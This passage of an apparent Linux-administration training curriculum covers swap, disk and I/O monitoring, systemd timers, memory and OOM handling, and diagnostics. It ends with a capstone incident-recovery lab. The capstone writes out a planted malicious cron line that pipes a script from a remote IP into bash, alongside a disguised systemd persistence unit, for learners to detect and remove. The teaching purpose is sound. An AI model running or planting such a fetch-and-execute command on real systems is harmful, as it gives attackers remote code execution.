1. Manage swap space: swap extends physical RAM by providing a disk area the kernel uses to page out infrequently accessed memory — view current swap with `swapon --show` or `cat /proc/swaps`; create a swap file: `fallocate -l 2G /swapfile` (allocate 2 GB contiguously), `chmod 600 /swapfile` (restrict permissions — a world-readable swap file exposes paged-out memory contents to any local user, a confidentiality risk on multi-user systems), `mkswap /swapfile` (write the swap header), `swapon /swapfile` (activate immediately) — add `/swapfile none swap sw 0 0` to /etc/fstab for persistence; disable with `swapoff /swapfile`; monitor swap usage in `free -h`'s Swap row — heavy swap consumption (non-zero used column growing) indicates memory pressure
2. Identify storage space consumers efficiently: `df -h` shows disk block space used and available per mounted filesystem; `df -i` shows inode usage — a filesystem can exhaust its inodes while block space remains (every file consumes one inode regardless of size; systems with millions of small files such as mail spools, session stores, and cache directories can hit the inode limit and produce "no space left on device" errors despite df -h showing free space); `du -sh /var/log` shows the total size of a directory tree; `du -sh /* 2>/dev/null | sort -hr | head -10` identifies the ten largest top-level directories in under a second; `find / -size +500M -type f -exec ls -lh {} \; 2>/dev/null` locates all individual files larger than 500 MB — the fastest approach to finding unexpected large log files, core dumps, or attacker staging files
3. Monitor disk health and I/O performance: `smartctl -a /dev/sda` reads SMART data from the disk firmware — the most critical attributes are Reallocated_Sector_Ct (non-zero = bad sectors remapped, disk is degrading), Current_Pending_Sector (sectors awaiting reallocation = imminent failure), and the overall health line (`SMART overall-health self-assessment test result: PASSED` or `FAILED`); `iostat -x 1 5` reports extended I/O statistics every second for 5 samples — the key columns are `%util` (percentage of time the device was busy) and `await` (average milliseconds per I/O request); high %util with high await indicates a disk I/O bottleneck; `iotop` shows per-process I/O bandwidth in real time — an unexpected process generating high I/O combined with rapid inode consumption is a behavioral indicator of ransomware or large-file exfiltration

**Skills Gained:** swap file creation (fallocate/chmod 600/mkswap/swapon/swapoff), /etc/fstab swap entry, swapon --show, swap security (chmod 600 required), free -h Swap row, df -h vs. df -i (block vs. inode exhaustion), inode exhaustion cause, du -sh and du -sh /* sort, find -size for large file discovery, smartctl -a (Reallocated_Sector_Ct/Current_Pending_Sector/health assessment), iostat -x (%util/await), iotop for per-process I/O, I/O + inode anomaly as ransomware indicator
**AI Mentor:** Connect I/O anomalies to security events: "Two behavioral signals of ransomware on Linux: a sudden spike in disk %util from a process with an unexpected name, and rapid inode consumption as thousands of encrypted files replace originals. Neither shows up as obvious CPU usage. `iotop` identifies which process is consuming disk bandwidth. `df -i` reveals the inode drain. If you see both patterns on a production server with no scheduled batch job to explain them, treat it as a ransomware incident and begin isolation — the window between encryption start and completion is minutes to hours."

### Module A3.C3.M4 — Performance Monitoring, Timers, and System Diagnostics

**Module Objectives:**
1. Create and manage systemd timer units as a structured alternative to cron with dependency management, catch-up execution, and journal-integrated logging
2. Monitor system performance with vmstat and /proc/meminfo; distinguish MemFree from MemAvailable and identify memory pressure conditions
3. Apply resource limits with ulimit and /etc/security/limits.conf; understand the OOM killer's scoring mechanism and protect critical processes
4. Execute a structured 6-step troubleshooting methodology using dmesg, lsof, strace, and a systematic 9-command diagnostic sequence

**KG Domain Coverage:** OS-L08 (system management — timers/performance/diagnostics — primary node for this module), OS-L09 (logging — dmesg/journald diagnostic integration)
**Practical Outcomes:** Learner creates a systemd timer unit that runs a maintenance script daily at 3 AM and verifies execution via journalctl, reads vmstat output and identifies a memory pressure condition from si/so columns, sets an open-file ulimit for www-data in /etc/security/limits.conf, reads an OOM kill event from /var/log/kern.log, uses lsof to find a process holding a deleted log file open and recovers the content from /proc/PID/fd/, and executes the complete 9-command diagnostic sequence on a degraded TerminalSimulator
**Required Interactive Components:** TerminalSimulator (systemctl list-timers --all, nano /etc/systemd/system/maintenance.timer, nano /etc/systemd/system/maintenance.service, systemctl daemon-reload, systemctl enable --now maintenance.timer, journalctl -u maintenance.service, vmstat 1 5, vmstat -s, free -h, cat /proc/meminfo, ulimit -a, ulimit -n 65536, cat /etc/security/limits.conf, renice 19 -p PID, dmesg -T | grep -iE "error|oom|killed", lsof -p PID, lsof | grep deleted, strace -p PID, uptime, w, last, ss -tlnp), ClickableDiagram (6-step diagnostic workflow: establish baseline → gather data → identify anomaly → form hypothesis → test one change → verify and document), QuizWidget
**Animation Categories:** systemd-timer-service-pair-activation, vmstat-field-group-decode, oom-score-calculation-victim-selection, ulimit-soft-hard-ceiling, lsof-deleted-file-fd-recovery, diagnostic-workflow-decision-tree
**Simulations:** OOM scenario (memory pressure builds → oom_score values rise → killer selects victim → kern.log entry appears); diagnostic runbook (degraded server presents symptoms → learner selects correct diagnostic commands in sequence → feedback on whether each step was necessary)
**Assessment Strategy:** Quiz-only for L1 and L3; quiz-and-challenge for L2 and L4

**Practical Progression:**
- **Beginner:** Run `vmstat 1 3` and identify three memory pressure columns: si (swap in), so (swap out), and free — explain what non-zero si and so values indicate about system health
- **Intermediate:** Add persistent open-file limits of 65536 for www-data to /etc/security/limits.conf, verify with `su -s /bin/bash www-data -c "ulimit -n"`, and explain why web servers require high file descriptor limits
- **Advanced:** Run `lsof | grep deleted` on the simulator, find the process with an open deleted log file, and recover the file content by reading `/proc/PID/fd/N` — explain why the content is still accessible
- **Capstone:** Not applicable at module level

##### A3.C3.M4.L1 — systemd Timers and Advanced Scheduling
- **Slug:** systemd-timers-advanced-scheduling | **Type:** expository | **Duration:** 40 min | **Difficulty:** intermediate | **Bloom's:** apply | **Ethical Content:** false
- **KG Nodes:** OS-L08, OS-L07 | **Prereqs:** A3.C3.M3.L4
- **Interactive:** TerminalSimulator (systemctl list-timers, systemctl list-timers --all, cat /lib/systemd/system/logrotate.timer, cat /lib/systemd/system/logrotate.service, systemctl status logrotate.timer, nano /etc/systemd/system/maintenance.timer, nano /etc/systemd/system/maintenance.service, systemctl daemon-reload, systemctl enable --now maintenance.timer, journalctl -u maintenance.service), ComparisonTable (cron vs. systemd timers: dependency management, missed-run handling, output logging, per-user support, resource control, activation types), QuizWidget
- **Animations:** timer-service-unit-pair-relationship, on-calendar-expression-examples, systemd-analyze-calendar-validation, persistent-true-missed-timer-catch-up
- **Practical:** guided-lab | **Assessment:** quiz-only | **Reflection:** articulation
- **Certs:** CompTIA Linux+ Domain 4, LPIC-1 Topic 107 | **Careers:** Linux Administrator, DevOps Engineer, Site Reliability Engineer | **Accessibility:** Timer-service pair naming relationship explained in text before animation; OnCalendar expression examples in an accessible table with English descriptions; cron vs. timers comparison table with proper headers; all unit file examples in accessible code blocks with annotated fields

**Learning Objectives:**
1. Explain systemd timer units and their relationship to service units: a .timer unit defines when to activate; the matching .service unit defines what to run — names must match (maintenance.timer activates maintenance.service) unless overridden with `Unit=`; view all active and inactive timers with `systemctl list-timers --all` (columns: timer name, next activation, last activation, service triggered) — and identify the three activation types: `OnCalendar=` (calendar-based schedule — `daily`, `weekly`, `*-*-* 03:15:00` for 3:15 AM every day, `Mon *-*-* 09:00:00` for every Monday at 9 AM), `OnBootSec=` (fixed delay after boot — `OnBootSec=5min` runs 5 minutes after system start), `OnUnitActiveSec=` (interval after last activation — creates a repeating timer with a gap between runs)
2. Write a timer-service unit pair: create /etc/systemd/system/maintenance.timer containing `[Unit] Description=Daily maintenance` and `[Timer] OnCalendar=*-*-* 03:00:00`, `AccuracySec=1min` (allow up to 1 minute of variance to spread load across identically-timed timers on multiple systems), `Persistent=true` (if the system was offline at the scheduled time, run at next startup — eliminates the cron requirement for anacron on servers that are not always on), and `[Install] WantedBy=timers.target`; create /etc/systemd/system/maintenance.service containing `[Unit] Description=Daily maintenance script` and `[Service] Type=oneshot` (run once and exit — not a long-running daemon), `ExecStart=/opt/scripts/maintenance.sh`; run `systemctl daemon-reload`, `systemctl enable --now maintenance.timer`, and verify with `journalctl -u maintenance.service`
3. Identify the three key advantages of systemd timers over cron for production workloads: (1) logging — timer output is captured by journald and queryable with `journalctl -u maintenance.service`, whereas cron output goes nowhere unless explicitly redirected; (2) dependency management — a timer can declare `After=network-online.target` to run only after a network connection is established, which cron cannot express; (3) catch-up with `Persistent=true` — a missed execution is run at next boot, preventing silently skipped maintenance; and identify when cron remains appropriate: per-user scheduled tasks for non-root accounts, output-to-email workflows, or environments that must avoid systemd-specific syntax

**Skills Gained:** systemd timer unit type, .timer + .service pair naming convention, systemctl list-timers --all, OnCalendar/OnBootSec/OnUnitActiveSec, OnCalendar expression syntax (daily/weekly/custom), AccuracySec, Persistent=true for catch-up, Type=oneshot, journalctl -u for timer execution output, timers.target, cron vs. timers three advantages (logging/dependencies/catch-up)
**AI Mentor:** Lead with the logging advantage: "The single biggest operational benefit of systemd timers over cron is that you can run `journalctl -u maintenance.service` and see exactly what your scheduled script printed, whether it succeeded or failed, and when it last ran — without redirecting output anywhere in the script. With cron, output disappears unless you explicitly add `| logger` or `>> logfile`. For any scheduled task important enough to monitor, a systemd timer is almost always the better choice on a modern system."

---

##### A3.C3.M4.L2 — Performance Monitoring and Resource Limits
- **Slug:** performance-monitoring-resource-limits | **Type:** expository | **Duration:** 50 min | **Difficulty:** intermediate | **Bloom's:** apply | **Ethical Content:** false
- **KG Nodes:** OS-L08 | **Prereqs:** A3.C3.M4.L1
- **Interactive:** TerminalSimulator (vmstat 1 5, vmstat -s, free -h, cat /proc/meminfo, cat /proc/meminfo | grep -E "^(MemFree|MemAvailable|Cached|Buffers|SwapTotal|SwapFree|Dirty)", ulimit -a, ulimit -n 65536, ulimit -u 500, cat /etc/security/limits.conf, echo "www-data soft nofile 65536" | sudo tee -a /etc/security/limits.conf, echo "www-data hard nofile 65536" | sudo tee -a /etc/security/limits.conf, nice -n 15 /opt/backup.sh &, renice 19 -p $(pgrep backup), ps -o pid,ni,comm), ComparisonTable (ulimit soft vs. hard: who can modify, what exceeding means, persistence scope), QuizWidget
- **Animations:** vmstat-procs-memory-swap-io-cpu-fields, memavailable-vs-memfree-distinction, ulimit-soft-hard-ceiling-diagram, nice-renice-scheduler-impact
- **Practical:** guided-lab | **Assessment:** quiz-and-challenge | **Reflection:** metacognitive
- **Certs:** CompTIA Linux+ Domain 3, LPIC-1 Topic 103, RHCSA EX200 | **Careers:** Linux Administrator, Site Reliability Engineer, DevOps Engineer | **Accessibility:** vmstat column reference table fully text-described with group names and units; MemAvailable vs. MemFree distinction explained in text before animation; ulimit soft/hard comparison table has proper headers; nice value scale labeled at -20/0/+19 anchors in text

**Learning Objectives:**
1. Interpret vmstat output: `vmstat 1 5` samples every second for 5 lines — column groups: procs (r = processes waiting for CPU, b = processes in D-state uninterruptible sleep), memory (swpd = swap space used, free = idle RAM, buff = kernel I/O buffers, cache = page cache — cache being non-zero is healthy and expected), swap (si = KB per second read from swap into RAM, so = KB per second written from RAM to swap — non-zero si/so indicates memory pressure and swap activity), io (bi = disk blocks read per second, bo = blocks written per second), system (in = interrupts per second, cs = context switches per second), cpu (us/sy/ni/id/wa/st — same as top's CPU row) — interpret `r` consistently above the CPU core count as CPU saturation and non-zero `so` as a memory overcommit condition
2. Distinguish MemFree from MemAvailable in /proc/meminfo: MemFree is raw unused physical memory — typically near zero on a healthy server because the kernel fills all available RAM with page cache to speed up I/O; MemAvailable is the kernel's estimate of how much memory can be given to a new application by evicting reclaimable cache and buffers on demand — this is the number to monitor; configure an alert when MemAvailable drops below 10% of MemTotal; and use ulimit to apply per-session resource limits: `ulimit -a` lists all limits; `ulimit -n 65536` sets the open file descriptor limit for the current session (essential for web servers, databases, and high-connection services); `ulimit -u 500` limits spawnable processes
3. Set persistent resource limits in /etc/security/limits.conf: each line has four fields — `username type limit value` where type is `soft` (the process can raise its own limit up to the hard ceiling) or `hard` (enforced by the kernel, requires root to raise); add `www-data soft nofile 65536` and `www-data hard nofile 65536` to apply open-file limits to all www-data sessions; limits apply at login via PAM's pam_limits module — verify they take effect with `su -s /bin/bash www-data -c "ulimit -n"`; for systemd services, use `LimitNOFILE=65536` in the `[Service]` section of the unit file, because /etc/security/limits.conf does not apply to services started directly by systemd

**Skills Gained:** vmstat 1 N, vmstat column groups (procs r/b, memory swpd/free/buff/cache, swap si/so, io bi/bo, system in/cs, cpu), r above core count = CPU saturation, si/so as memory pressure indicators, MemFree vs. MemAvailable distinction, page cache as beneficial, MemAvailable monitoring threshold, ulimit -a/-n/-u, /etc/security/limits.conf (username/soft/hard/limit), soft vs. hard limit semantics, LimitNOFILE= in systemd unit for services, nice -n and renice
**AI Mentor:** The MemFree confusion causes unnecessary panic: "New Linux administrators see MemFree at nearly zero and think the server is out of memory. It is not. Linux intentionally fills all available RAM with page cache to accelerate disk I/O — this is correct and beneficial behavior. The number to watch is MemAvailable in /proc/meminfo, which is the kernel's own assessment of how much it can actually give to a new application. When MemAvailable is healthy, MemFree being zero is a sign of optimal performance. When MemAvailable also approaches zero, you have a real problem."

---

##### A3.C3.M4.L3 — Memory Management and the OOM Killer
- **Slug:** memory-management-oom-killer | **Type:** expository | **Duration:** 40 min | **Difficulty:** intermediate | **Bloom's:** understand | **Ethical Content:** false
- **KG Nodes:** OS-L08 | **Prereqs:** A3.C3.M4.L1, A3.C3.M4.L2
- **Interactive:** TerminalSimulator (cat /proc/meminfo, cat /proc/PID/status | grep -i vm, cat /proc/PID/oom_score, cat /proc/PID/oom_score_adj, echo -500 | sudo tee /proc/PID/oom_score_adj, grep -i "out of memory" /var/log/kern.log, dmesg -T | grep -iE "oom|killed process|memory"), ClickableDiagram (OOM killer decision flow: memory exhausted → kernel scans all processes → calculates oom_score per process → selects highest scorer → sends SIGKILL → logs to kern.log), QuizWidget
- **Animations:** oom-pressure-builds-score-rises, oom-victim-selection-scoring, kern-log-oom-entry-anatomy, oom-score-adj-protection-effect
- **Practical:** simulation | **Assessment:** quiz-only | **Reflection:** metacognitive
- **Certs:** CompTIA Linux+ Domain 3, LPIC-1 Topic 103 | **Careers:** Linux Administrator, Site Reliability Engineer, Incident Responder | **Accessibility:** OOM killer decision flow diagram text-labeled with aria descriptions per step; oom_score calculation explained in plain language; kern.log OOM entry decoded field by field; oom_score_adj protection values in a reference table; all /proc paths in accessible code blocks

**Learning Objectives:**
1. Explain the OOM (Out-of-Memory) killer: when the kernel cannot satisfy a memory allocation request because physical RAM and swap are both exhausted, it invokes the OOM killer to forcibly free memory by terminating a process — the kernel calculates an oom_score for each process (0–1000) based primarily on the process's RSS memory usage plus its children's RSS, adjusted by oom_score_adj; the process with the highest score is selected as the victim and sent SIGKILL; the entire event is logged to the kernel ring buffer with a message containing "Out of memory: Kill process N (name)" visible via `dmesg -T | grep -i "killed process"` and in /var/log/kern.log
2. Read and interpret a kern.log OOM entry: the log contains the victim process name and PID, the oom_score at the time of kill, the amount of RSS freed, and a snapshot of system memory state at the moment (total RAM, free RAM, swap usage, anon pages, mapped pages) — use this to reconstruct what triggered the OOM event and whether the correct process was selected; an OOM kill of an application server during a known traffic spike is explainable and expected; an OOM kill of sshd or a critical service when memory should be adequate is anomalous — investigate which process consumed the memory and whether its behaviour was authorised
3. Protect critical processes from OOM killing: write a negative value to `/proc/PID/oom_score_adj` to reduce the process's attractiveness as a victim (range -1000 to +1000; -1000 makes the process effectively unkillable by OOM); make protection persistent for a systemd service by adding `OOMScoreAdjust=-500` or `OOMScoreAdjust=-1000` to the `[Service]` section of its unit file — and explain the design trade-off: protecting too many processes leaves the OOM killer with fewer candidates and may force it to kill a more critical process; protect only genuinely essential daemons (sshd, the primary database) and allow the OOM killer to select victims from application processes

**Skills Gained:** OOM killer trigger (RAM + swap exhausted), oom_score (0–1000, RSS-based), oom_score_adj (-1000 to +1000), OOM kill evidence in kern.log and dmesg, "killed process" grep pattern, OOM entry fields (victim/score/RSS/memory state), OOM as anomaly indicator for memory leak or unauthorized process, /proc/PID/oom_score_adj manual protection, OOMScoreAdjust= in systemd unit file, protection trade-off
**AI Mentor:** Frame OOM events as diagnostic signals: "An OOM kill is never a normal condition on a properly sized server. Every OOM kill should trigger an investigation: was it a traffic spike the server cannot handle (capacity problem)? A memory leak accumulating over days (application bug — watch RSS growth with `watch -n 60 'cat /proc/PID/status | grep VmRSS'`)? Or an unexpected process consuming memory without a business justification (security incident — check the process lineage with `ps -ef --ppid N` to find who launched it)? The answer determines whether you need more RAM, a code fix, or an incident response."

---

##### A3.C3.M4.L4 — Troubleshooting Methodology and System Diagnostics
- **Slug:** troubleshooting-methodology-system-diagnostics | **Type:** discovery | **Duration:** 55 min | **Difficulty:** intermediate | **Bloom's:** evaluate | **Ethical Content:** false
- **KG Nodes:** OS-L08, OS-L09 | **Prereqs:** A3.C3.M4.L1, A3.C3.M4.L2, A3.C3.M4.L3
- **Interactive:** TerminalSimulator (uptime, w, last, who, dmesg -T | tail -50, dmesg --level=err,crit, lsof -p PID, lsof -i :443, lsof | grep deleted, lsof -u alice, strace -p PID -e trace=network, strace -c -p PID, ss -tlnp, ss -s, journalctl -p err --since "1 hour ago", ps aux --sort=-%cpu | head -10, df -h && df -i, free -h, full degraded-server diagnostic scenario), ClickableDiagram (6-step diagnostic workflow: (1) establish baseline → (2) gather data before acting → (3) identify the anomaly → (4) form a specific hypothesis → (5) test one change → (6) verify and document), QuizWidget
- **Animations:** dmesg-ring-buffer-timestamp-format, lsof-deleted-fd-proc-path-recovery, strace-syscall-output-fields, diagnostic-workflow-decision-tree
- **Practical:** free-lab | **Assessment:** quiz-and-challenge | **Reflection:** transfer
- **Certs:** CompTIA Linux+ Domain 3, LPIC-1 Topic 103, RHCSA EX200, CompTIA Security+ Domain 3 | **Careers:** Linux Administrator, SOC Analyst, Incident Responder, Site Reliability Engineer | **Accessibility:** 6-step diagnostic workflow diagram text-labeled with aria descriptions per step; lsof deleted file recovery documented as numbered steps; strace output fields described in plain language; dmesg timestamp format explained before animation; all command examples in accessible code blocks

**Learning Objectives:**
1. Apply a structured 6-step troubleshooting methodology to any Linux system problem: (1) establish a baseline — before assuming something is wrong, confirm what the system should be doing: expected services, normal load range, typical disk usage; (2) gather data without acting — run uptime, w, who, last, ps aux, df -h && df -i, free -h, journalctl -p err, and dmesg before touching anything; (3) identify the anomaly — compare observed state against the baseline; (4) form the most specific single hypothesis that explains all observations; (5) test one change at a time and observe the effect; (6) document every command run, every finding, and every change made — and explain why gathering data before acting is the most violated rule: an administrator who restarts a failed service before reading its journal has destroyed the primary diagnostic evidence
2. Use advanced tools to investigate process and file state: `lsof -p PID` lists all files, sockets, and pipes open by a process; `lsof -i :443` identifies which process owns a port; `lsof | grep deleted` finds all open descriptors pointing to deleted files — a common cause of disk-full conditions where `df` reports a full filesystem but `du` totals do not account for all the space (the deleted file's blocks are retained by the kernel until the last process closes its descriptor — recover content with `cat /proc/PID/fd/N`); `strace -p PID` attaches to a running process and traces all system calls in real time (useful for diagnosing hangs, unexpected connections, and slow I/O); `strace -c -p PID` produces a system call count and time summary
3. Execute the 9-command diagnostic sequence for a degraded Linux server: (1) `uptime` — load average context and system age; (2) `w` — who is logged in and what are they running; (3) `last | head -20` — recent login history including suspicious off-hours access; (4) `dmesg -T | grep -iE "error|fail|warn|oom|killed"` — kernel-level hardware and OOM events; (5) `journalctl -p err --since "1 hour ago"` — service-level errors; (6) `ps aux --sort=-%cpu | head -10` — top CPU consumers; (7) `ps aux --sort=-%mem | head -10` — top memory consumers; (8) `df -h && df -i` — disk block and inode exhaustion; (9) `ss -tlnp` — listening services and their PIDs — this sequence, executed in under two minutes, identifies the root cause of 80% of production Linux performance and availability incidents

**Skills Gained:** 6-step troubleshooting methodology (baseline/gather/identify/hypothesize/test/document), data-before-action discipline, uptime/w/last/who session context, dmesg -T with error filter, lsof -p/-i :port/deleted, deleted-but-open file disk space trap, /proc/PID/fd/N content recovery, strace -p (live syscall trace), strace -c (summary), ss -tlnp (listening service discovery), 9-command diagnostic sequence
**AI Mentor:** The data-before-action rule is the hardest discipline to maintain under pressure: "When production is down, every instinct says act immediately. But restarting a failed service before reading its journal destroys the root cause evidence. The service may restart successfully while the underlying cause remains — and it will fail again at 3 AM next week. Force yourself to run the 9-command diagnostic sequence before touching any service. Two minutes of data collection prevents hours of guessing. If someone is pressuring you to restart first and investigate later, the answer is: 'I need 90 seconds to collect diagnostic data so I can fix this properly and prevent recurrence.'"

---

### Course A3.C3 — Capstone

**Title:** Operation Night Shift — Production Server Recovery
**Type:** quiz-and-capstone | **Duration:** 90 min | **Difficulty:** intermediate

**Scenario:** Learner is the on-call Linux administrator at Helix Corp. At 02:47 AM, an automated monitoring alert fires: the primary application server is responding to health checks intermittently, the application team reports the web service is returning 503 errors, and a second alert fires three minutes later indicating disk utilisation at 99%. The learner connects via SSH to a TerminalSimulator representing the live server — which has been seeded with a set of compounding failures: a runaway process filling the disk, a failed service that cannot restart because the disk is full, a missing log pipeline, a malicious systemd persistence unit, and a cron-based dropper. The learner must work through the incident methodically without making it worse, restore the service, eliminate the attacker's persistence, and produce an incident report:

1. **Initial triage — apply the 9-command diagnostic sequence:** Run `uptime` and record the load average — the simulator shows load above 8.0 on a 4-core system; run `w` to see who else is logged in and `last | head -20` to check recent login history for anomalies; run `dmesg -T | grep -iE "error|oom|killed"` to check for kernel OOM events; run `journalctl -p err --since "1 hour ago"` to identify service errors; run `ps aux --sort=-%cpu | head -10` to identify the top CPU consumer — document the process name, PID, %CPU, %MEM, and elapsed runtime; run `ps aux --sort=-%mem | head -10` to identify any unexpected high-memory process; run `df -h && df -i` to confirm disk and inode status; run `ss -tlnp` to verify which services are listening — confirm the web application port (8080) is not listed; use the 9-command output to form a priority-ordered list of findings before taking any remediation action

2. **Disk recovery — identify and resolve the disk-full condition:** Use `du -sh /* 2>/dev/null | sort -hr | head -10` to identify the top-level directory consuming the most space; navigate into the largest directory and run `du -sh * 2>/dev/null | sort -hr | head -10` to drill down to the specific subdirectory; the simulator contains a runaway log file created by the high-CPU process at /var/log/appd/debug.log currently at 38 GB — examine the file with `tail -n 20 /var/log/appd/debug.log` to confirm it is actively growing; identify the PID writing to it using `lsof | grep debug.log`; stop the runaway process with SIGTERM first, wait 10 seconds, then SIGKILL if it does not stop — confirm it is gone with `ps aux | grep appd`; delete the log file with `rm /var/log/appd/debug.log`; verify the disk is now below 60% with `df -h`; run `lsof | grep deleted` and confirm no process still holds the old file descriptor open — if one does, note the PID and FD number for the incident report but do not kill it until confirmed non-critical

3. **Service restoration — restart the failed service and verify recovery:** Run `systemctl status webapp.service` and read the last 20 journal lines — the service failed with exit code 1 because it could not write to its log directory when the disk was full; run `journalctl -u webapp.service -n 50` to read the full failure context; start the service with `systemctl start webapp.service`; verify it is active with `systemctl is-active webapp.service` and confirm the port is listening with `ss -tlnp | grep 8080`; make a test HTTP request with `curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/health` and confirm a 200 response; check the service is enabled at boot with `systemctl is-enabled webapp.service` and enable it if not; document the service's exact failure timestamp from the journal and the restoration timestamp

4. **Log pipeline investigation — restore missing logs:** Run `journalctl -p err --since "3 hours ago" | grep rsyslog` to check whether rsyslog is operating; run `systemctl status rsyslog` — the simulator shows rsyslog has been stopped; run `journalctl -u rsyslog -n 30` to read why it stopped — the service crashed because its output directory /var/log/remote/ was deleted by the attacker to reduce logging visibility; recreate the directory with `mkdir -p /var/log/remote && chown syslog:syslog /var/log/remote && chmod 750 /var/log/remote`; restart rsyslog with `systemctl restart rsyslog`; inject a test message with `logger -t capstone "log pipeline restored"` and verify it appears in `grep capstone /var/log/syslog`; configure `Storage=persistent` in /etc/systemd/journald.conf and restart journald to ensure future reboots preserve the journal; note in the incident report that the log gap between the rsyslog crash time and restoration time means events in that window are not in the local log — remote syslog server logs must be consulted for that period

5. **Persistence removal — find and eliminate attacker footholds:** Run `systemctl list-unit-files --state=enabled | grep -v -f /opt/baseline/enabled-services.txt` (a baseline file provided in the lab listing expected enabled services) to identify any extra enabled service units — the simulator contains one malicious unit: `sysd-update.service`, designed to look like a system update service; run `systemctl status sysd-update.service`, `cat /etc/systemd/system/sysd-update.service`, and `cat /etc/systemd/system/sysd-update.timer` to read the unit file contents — the service ExecStart points to a binary at /tmp/.sysd/updater; run `systemctl disable --now sysd-update.timer sysd-update.service`, `rm /etc/systemd/system/sysd-update.*`, and `systemctl daemon-reload`; then perform a full cron audit: `for u in $(ls /var/spool/cron/crontabs/ 2>/dev/null); do echo "=== $u ==="; sudo cat "/var/spool/cron/crontabs/$u"; done` and `sudo cat /etc/cron.d/*` — identify the malicious cron entry running `curl http://203.0.113.45/payload.sh | bash` every 5 minutes under the www-data account; remove it with `sudo crontab -u www-data -r` and verify with `sudo crontab -u www-data -l`; delete the attacker's binary and staging directory with `rm -rf /tmp/.sysd`

6. **System integrity verification and incident report:** Run `dpkg --verify` and note any package files modified since installation — record any findings as potential indicators of tampering; run `find /usr /bin /sbin -newer /var/log/dpkg.log -type f 2>/dev/null` to identify system binaries modified more recently than the last package operation; run `awk -F: '($3==0){print}' /etc/passwd` to confirm only root has UID 0; run `sudo grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/` to confirm no dangerous sudoers entries were added; run `systemctl list-unit-files --state=enabled` one final time to confirm no additional persistence units remain; then write a structured incident report with exactly six sections: (1) Timeline — all events with timestamps from journal and dmesg in chronological order; (2) Root Cause — the runaway appd process filling the disk was the precipitating event, enabling the attacker to operate while logs were interrupted; (3) Attacker Actions — persistence via sysd-update.service/timer and cron dropper under www-data, log disruption via rsyslog directory deletion; (4) Impact — webapp service downtime from failure timestamp to restoration timestamp (extracted from journal); (5) Remediation Steps — all actions taken with timestamps; (6) Recommendations — remote log forwarding, LVM for /var/log, baseline file monitoring with systemctl, and swap increase to prevent OOM conditions during load spikes

**Assessment Criteria:** Diagnostic sequence correctness and finding prioritisation (20%), disk recovery accuracy including lsof deleted-file check and correct signal escalation (20%), service restoration with journal-based root cause analysis (15%), log pipeline restoration and persistent journal configuration (15%), persistence removal completeness — both systemd unit and cron entry identified and removed (20%), incident report structure, timeline accuracy, and recommendation quality (10%)
**KG Validation:** OS-L08 (processes/signals/systemd/storage/performance/diagnostics), OS-L09 (journalctl/rsyslog/log tampering), OS-L07 (cron persistence audit), OS-L02 (file permissions on recovered directories), OS-L06 (SUID binary check in integrity verification) — all exercised and integrated under realistic incident conditions
**Mastery Gate:** ≥80% to unlock Course A3.C4

---

## PART 4: COURSE A3.C4 — LINUX NETWORKING, SECURITY, AND HARDENING

**Purpose:** Courses 1–3 built the operating system foundation — filesystem, administration, processes, and system management. This course applies that foundation to two domains that define Linux in professional security work: networking and hardening. Learners configure network interfaces, diagnose connectivity failures, master SSH for hardened remote administration, write firewall rules, configure mandatory access control with SELinux and AppArmor, audit system activity with auditd, and apply CIS benchmark hardening principles to a production server. The course is practice-heavy — every module ends with a structured practical that produces a hardened, measurable configuration. Learners who complete this course can administer a Linux server remotely with key-based SSH, lock down its attack surface with a host firewall and MAC policy, monitor privileged activity with auditd, and verify the server's security posture against an industry benchmark.

**Learning Outcomes:**
- Configure network interfaces and IP addressing using the ip command suite; manage Netplan configuration on Ubuntu
- Troubleshoot DNS name resolution failures using /etc/resolv.conf, /etc/hosts, dig, and hostnamectl
- Diagnose network connectivity systematically with ping, traceroute, ss, netstat, and tcpdump
- Transfer files securely with scp, rsync, wget, and curl; explain the security trade-offs of each
- Explain the OpenSSH architecture, authentication flow, and cryptographic key exchange
- Generate RSA and Ed25519 key pairs, deploy public keys with ssh-copy-id, and manage keys with ssh-agent
- Harden an SSH server: disable root login, disable password authentication, restrict allowed users, change the default port, and deploy Fail2Ban
- Configure UFW firewall rules to implement a default-deny host policy
- Apply mandatory access control with SELinux in enforcing mode and AppArmor profiles; interpret and resolve policy violations
- Implement least privilege: configure sudoers correctly, audit SUID binaries, and create locked service accounts
- Configure auditd rules to monitor privileged commands, file access, and user account changes; search audit logs with ausearch and aureport
- Apply CIS Benchmark Level 1 controls to a fresh Ubuntu 22.04 installation
- Perform a complete security assessment and produce a hardening report with remediation recommendations

**Estimated Hours:** 9–11 hours | **Difficulty:** intermediate | **Prerequisites:** A3.C3 Capstone (≥80%)
**Career Relevance:** Linux Administrator, SOC Analyst, Incident Responder, Security Engineer, DevOps/DevSecOps Engineer, Cloud Security Engineer, Junior Penetration Tester
**Certification Alignment:** CompTIA Linux+ XK0-005 Domains 2 and 4 (~70%), LPIC-1 Topics 109–111 (~85%), RHCSA EX200 networking and security sections (~45%), CompTIA Security+ SY0-701 Domains 2 and 3 (~40%), CIS Benchmark for Ubuntu Linux 22.04 LTS (partial, ~60%)

---

### Module A3.C4.M1 — Linux Networking Essentials

**Module Objectives:**
1. Configure network interfaces and static IP addressing using the ip command suite and Netplan
2. Troubleshoot DNS name resolution failures using /etc/resolv.conf, /etc/hosts, hostnamectl, and dig
3. Diagnose network connectivity systematically using ping, traceroute, ss, netstat, and tcpdump fundamentals
4. Transfer files and data securely using scp, rsync, wget, and curl and explain their security trade-offs

**KG Domain Coverage:** OS-L05 (SSH — introductory exposure via scp/sftp), NET-02 (IP addressing applied on Linux), NET-07 (DNS applied on Linux), NET-12 (packet capture — tcpdump fundamentals)
**Practical Outcomes:** Learner assigns a static IP to a simulated interface with ip addr add and verifies routing with ip route show; edits /etc/resolv.conf to change the resolver and confirms with dig; executes a 5-step connectivity diagnostic sequence to identify a simulated network fault; uses rsync with --archive --delete to back up a directory and verifies with diff
